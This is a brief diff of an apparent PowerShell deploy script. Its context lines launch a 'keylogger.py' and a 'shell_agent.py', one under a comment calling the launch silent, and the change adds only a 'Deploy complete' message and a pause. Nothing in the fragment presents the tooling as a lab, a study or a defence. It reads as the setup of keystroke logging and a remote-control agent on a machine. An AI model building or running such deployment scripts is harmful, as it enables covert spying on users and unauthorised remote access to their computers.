@@ -32,3 +32,6 @@ Start-Process python -ArgumentList "$dir\shell_agent.py" -WindowStyle Normal
 # Launch keylogger.py silently in background
 Start-Process python -ArgumentList "$dir\keylogger.py" -WindowStyle Normal
 
+# Keep window open so we can read any errors
+Write-Host "`n[+] Deploy complete. Press any key to close..."
+pause
